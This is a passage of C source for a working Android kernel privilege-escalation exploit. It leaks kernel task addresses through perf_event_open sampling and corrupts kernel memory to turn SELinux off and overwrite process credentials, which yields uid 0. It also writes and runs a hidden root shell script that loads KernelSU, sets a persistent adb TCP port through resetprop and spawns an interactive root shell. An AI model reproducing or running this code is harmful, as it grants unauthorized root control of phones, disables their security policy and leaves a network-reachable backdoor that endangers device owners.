      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
  }
}

static void write_root_script(void) {
  int sfd = open("/data/local/tmp/.ghostlock_root.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
  if (sfd < 0) return;
  int policy_script_ready = write_selinux_policy_fix_script();
  unlink("/data/local/tmp/.ghostlock_ksu.status");
  const char *script =
    "#!/system/bin/sh\n"
    "ROOT_LOG=/data/local/tmp/.ghostlock_root.log\n"
    "STATUS=/data/local/tmp/.ghostlock_ksu.status\n"
    "diag() { echo \"$*\"; echo \"$*\" >>$ROOT_LOG; }\n"
    "report_status() { printf '%s\\n' \"$1\" >$STATUS; }\n"
    "report_status pending\n"
    "diag '[+] root shell pid='$$' uid='$(id -u)\n"
    "if [ -x /data/local/tmp/.ghostlock_fixpol.sh ]; then\n"
    "  diag '[*] repairing SELinux policy before KernelSU'\n"
    "  if /system/bin/sh /data/local/tmp/.ghostlock_fixpol.sh; then\n"
    "    diag '[+] early SELinux policy repair succeeded'\n"
    "    diag '[*] keeping SELinux permissive until KernelSU is ready'\n"
    "  else\n"
    "    diag '[!] early SELinux policy repair failed; see .ghostlock_policy.log'\n"
    "  fi\n"
    "  rm -f /data/local/tmp/.ghostlock_fixpol.sh\n"
    "else\n"
    "  diag '[!] policy repair script was not created'\n"
    "fi\n"
    "KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
    "KSU_READY=0\n"
    "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
    "  diag '[+] KernelSU already loaded'\n"
    "  KSU_READY=1\n"
    "elif [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
    "  diag '[*] ksud:' $KSUD\n"
    "  chmod 755 \"$KSUD\" 2>/dev/null\n"
    "  KVER=$(uname -r | cut -d. -f1-2)\n"
    "  AVER=$(uname -r | grep -o 'android[0-9]*')\n"
    "  KMI=\"${AVER}-${KVER}\"\n"
    "  diag '[*] KMI=' $KMI\n"
    "  mkdir -p /data/adb/ksu 2>/dev/null\n"
    "  diag '[*] ksud late-load --kmi' $KMI\n"
    "  KSUD_LOG=/data/local/tmp/.ghostlock_ksud.log\n"
    "  rm -f \"$KSUD_LOG\"\n"
    "  setsid \"$KSUD\" late-load --kmi \"$KMI\" </dev/null >\"$KSUD_LOG\" 2>&1 &\n"
    "  KSUD_PID=$!\n"
    "  diag '[*] ksud pid='$KSUD_PID\n"
    "  KSUD_EXITED=0\n"
    "  for w in $(seq 1 30); do\n"
    "    if ! kill -0 \"$KSUD_PID\" 2>/dev/null; then KSUD_EXITED=1; break; fi\n"
    "    sleep 1\n"
    "  done\n"
    "  if [ \"$KSUD_EXITED\" = 1 ]; then\n"
    "    wait \"$KSUD_PID\"; KSUD_STATUS=$?\n"
    "    diag '[*] ksud exit='$KSUD_STATUS\n"
    "  else\n"
    "    diag '[!] ksud still running after 30s; capturing process state'\n"
    "    cat /proc/$KSUD_PID/status >>$ROOT_LOG 2>&1\n"
    "    cat /proc/$KSUD_PID/wchan >>$ROOT_LOG 2>&1\n"
    "  fi\n"
    "  if [ -s \"$KSUD_LOG\" ]; then\n"
    "    diag '[*] ksud output:'\n"
    "    tail -n 40 \"$KSUD_LOG\"\n"
    "    tail -n 40 \"$KSUD_LOG\" >>$ROOT_LOG\n"
    "  fi\n"
    "fi\n"
    "if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; fi\n"
    "if [ \"$KSU_READY\" = 1 ]; then\n"
    "  diag '[+] KSU LOADED'\n"
    "  grep kernelsu /proc/modules\n"
    "  RSPROP=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "  if [ -n \"$RSPROP\" ]; then\n"
    "    chmod 755 \"$RSPROP\" 2>/dev/null\n"
    "    ADB_PORT=$(cat /data/local/tmp/a/adb_port 2>/dev/null || echo 5555)\n"
    "    \"$RSPROP\" resetprop -p persist.adb.tcp.port $ADB_PORT 2>&1 && echo \"[+] persist.adb.tcp.port=$ADB_PORT set via resetprop\"\n"
    "    \"$RSPROP\" resetprop service.adb.tcp.port $ADB_PORT 2>/dev/null\n"
    "  fi\n"
    "  rm -f /data/local/tmp/.ghostlock_w1\n"
    "  APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed 's/package://')\n"
    "  if [ -n \"$APK\" ] && [ -x /data/adb/ksud ]; then\n"
    "    /data/adb/ksud kernel dynamic-manager set-apk \"$APK\" 2>/dev/null && echo '[+] dynamic manager set'\n"
    "  fi\n"
    "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "  diag '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
    "  report_status ready\n"
    "  diag '[+] done'\n"
    "else\n"
    "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "  diag '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
    "  report_status failed:module-not-loaded\n"
    "  diag '[!] KSU NOT loaded'\n"
    "fi\n"
    "if [ -t 0 ]; then exec /system/bin/sh -i; fi\n";
  if (!policy_script_ready) {
    pr_info("root script: early policy repair script unavailable\n");
  }
  write(sfd, script, strlen(script));
  close(sfd);
}

static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256]; int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8;
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uintptr_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  return best;
}

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  uintptr_t my_task = perf_find_task();
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  if (!my_task) _exit(1);
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
    else if (cmd == 'G') break;
  }
  close(p->cmd_r); close(p->uid_w);
  if (getuid() != 0) _exit(1);
  pid_t gc = fork();
  if (gc == 0) {
    int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
    if (efd >= 0) { write(efd, "0", 1); close(efd); }
    execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
    _exit(1);
  }
  if (gc < 0) _exit(1);
  int status = 0;
  while (waitpid(gc, &status, 0) < 0) {
    if (errno == EINTR) continue;
    _exit(1);
  }
  if (WIFEXITED(status)) _exit(WEXITSTATUS(status));
  if (WIFSIGNALED(status)) _exit(128 + WTERMSIG(status));
  _exit(1);
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

int run_exploit(int argc, char **argv) {
  g_probe_cycle = 0;
  g_probe_only = 0;
  g_one_shot = 0;
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--probe-cycle") == 0) {
      g_probe_cycle = 1;
    }
    if (strcmp(argv[i], "--probe-only") == 0) {
      g_probe_only = 1;
    }
    if (strcmp(argv[i], "--one-shot") == 0) {
      g_one_shot = 1;
    }
  }
  setvbuf(stdout, NULL, _IONBF, 0);
  CP("run_exploit: start");
  pr_info("PI cycle mode: %s\n", g_probe_cycle ? "value-based probe" : "LOCK_PI");
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();

  if (!active_offsets && select_offsets() < 0) return 1;
  CP("run_exploit: offsets selected");

  log_startup_context();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);

  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base) {
    kaslr_base = active_offsets->kimage_text_base;
  }
  kaslr_done = 1;

  timer_reset();
  TIMER("exploit start");
  CP("run_exploit: timer reset");

  write_root_script();
  CP("run_exploit: root script written");

  /* Phase 1 */
  int selinux_ok = check_selinux_off();
  int umh_available = active_offsets &&
      active_offsets->off_system_unbound_wq &&
      active_offsets->off_ashmem_misc_fops;

  if (!selinux_ok && umh_available) {
    pr_info("UMH path: fops redirect (mode=4)...\n");
    slab_drain();
    TIMER("pre-UMH drain");
    do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
    TIMER("fops redirect done");
    selinux_ok = check_selinux_off();
  }

  if (!selinux_ok && !root_child_done) {
    slab_drain();
    TIMER("pre-W1 drain");
    int w1_max = g_one_shot ? 1 : 5;
    for (int att = 1; att <= w1_max && !selinux_ok; att++) {
      pr_info("Write 1 attempt %d/%d\n", att, w1_max);
      CP("run_exploit: W1 attempt");
      do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
      usleep(100000);
      if (check_selinux_off()) { pr_success("SELinux DISABLED\n"); selinux_ok = 1; }
    }
    if (!selinux_ok) { pr_error("Write 1 failed\n"); return 1; }
    TIMER("Write 1 complete");
  } else if (!selinux_ok && root_child_done) {
    selinux_ok = 1;
  } else {
    pr_success("SELinux off (UMH or already)\n");
  }
  CP("run_exploit: phase 1 done");

  if (root_child_done) {
    pr_success("UMH root done — skipping W2\n");
    TIMER("exploit complete (UMH)");
    return wait_for_ksu_status();
  }

  pr_info("UMH not available, falling back to W2 cred path\n");
  slab_drain();
  TIMER("pre-W2 drain");

  struct child_pipes pipes;
  pid_t child = spawn_child(&pipes);
  if (child < 0) { pr_error("fork failed\n"); return 1; }

  uintptr_t child_task = 0;
  read(pipes.task_r, &child_task, sizeof(child_task));
  close(pipes.task_r);
  TIMER("perf_find_task done");

  if (!child_task) {
    pr_info("perf returned 0, retrying...\n");
    waitpid(child, NULL, 0);
    child = spawn_child(&pipes);
    if (child < 0) { pr_error("retry fork failed\n"); return 1; }
    read(pipes.task_r, &child_task, sizeof(child_task));
    close(pipes.task_r);
  }

  if (!child_task) {
    pr_error("Cannot find task_struct (perf blocked by seccomp?)\n");
    close(pipes.cmd_w);
    waitpid(child, NULL, 0);
    return 1;
  }

  pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
  pselect_child_node = 1;

  int got_root = 0;
  int w2_max = g_one_shot ? 1 : 10;
  for (int round = 1; round <= w2_max && !got_root; round++) {
    pr_info("round %d/%d: cred write\n", round, w2_max);
    CP("run_exploit: W2 round");
    slab_drain();
    if (!do_one_write(child_task + TASK_CRED_OFF, "W2: cred", 2)) {
      pr_warning("W2: cred preparation failed on round %d\n", round);
      continue;
    }
    usleep(50000);
    write(pipes.cmd_w, "C", 1);
    uint32_t child_uid = 9999;
    read(pipes.uid_r, &child_uid, sizeof(child_uid));
    pr_info("child uid = %u\n", child_uid);
    if (child_uid == 0) { pr_success("child is root!\n"); got_root = 1; }
  }

  write(pipes.cmd_w, "G", 1);
  close(pipes.cmd_w); close(pipes.uid_r);

  if (!got_root) {
    pr_error("failed after 10 rounds\n");
    waitpid(child, NULL, 0);
    return 1;
  }

  sleep(2);
  TIMER("exploit complete");
  CP("run_exploit: COMPLETE");
  return wait_for_ksu_status();
}

int install_embedded_wallpaper(void) { return 0; }

static int run_write1_only(void);
extern int mini_adb_port;
extern int mini_adb_shell(const char *cmd);

static int run_bootstrap(void) {
  log_startup_context();
  pid_t w1_child = fork();
  if (w1_child < 0) {
    pr_error("cannot fork W1 helper errno=%d\n", errno);
    return 1;
  }
  if (w1_child == 0) {
    _exit(run_write1_only());
  }
  int w1_status;
  pid_t waited;
  do {
    waited = waitpid(w1_child, &w1_status, 0);
  } while (waited < 0 && errno == EINTR);
  if (waited < 0) {
    pr_error("waiting for W1 helper failed errno=%d\n", errno);
    return 1;
  }
  if (!WIFEXITED(w1_status) || WEXITSTATUS(w1_status) != 0) {
    pr_error("W1 helper failed status=%d\n", w1_status);
    return 1;
  }
  pr_info("W1 helper exited; reclaimed state released before W2\n");

  int adb_port = 5555;
  char port_buf[32] = {};
  read_first_line("/data/local/tmp/a/adb_port", port_buf, sizeof(port_buf));
  if (port_buf[0]) adb_port = atoi(port_buf);
  if (adb_port <= 0 || adb_port > 65535) adb_port = 5555;
  pr_info("Waiting for adb TCP on port %d...\n", adb_port);
  for (int i = 0; i < 30; i++) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {
      .sin_family = AF_INET,
      .sin_port = htons(adb_port),
      .sin_addr.s_addr = htonl(0x7f000001)
    };
    int c = (sock >= 0) ? connect(sock, (struct sockaddr *)&addr, sizeof(addr)) : -1;
    if (sock >= 0) close(sock);
    if (c == 0) {
      pr_success("adbd ready on port %d (attempt %d)\n", adb_port, i + 1);
      goto tcp_ready;
    }
    usleep(1000000);
  }
  pr_error("adbd not on TCP %d after 30s\n", adb_port);
  return 1;
tcp_ready:
  usleep(200000);
  mini_adb_port = adb_port;
  pr_info("Connecting via mini-adb on port %d...\n", adb_port);
  int adb_ret = mini_adb_shell("/data/local/tmp/a/e");
  pr_info("mini-adb returned %d\n", adb_ret);
  return adb_ret;
}

static int run_write1_only(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base) {
    kaslr_base = active_offsets->kimage_text_base;
  }
  kaslr_done = 1;

  if (check_selinux_off()) {
    pr_success("SELinux already off\n");
    return 0;
  }

  for (int att = 1; att <= 20; att++) {
    slab_drain();
    pr_info("Write 1 attempt %d/20\n", att);
    do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
    usleep(100000);
    if (check_selinux_off()) {
      pr_success("SELinux DISABLED\n");
      return 0;
    }
  }
  pr_error("Write 1 failed after 20 attempts\n");
  return 1;
}

int main(int argc, char **argv) {
    handle_umh_mode(argc, argv);
    if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0)
        return run_bootstrap();
    if (argc > 1 && strcmp(argv[1], "--write1") == 0)
        return run_write1_only();
    return run_exploit(argc, argv);
}
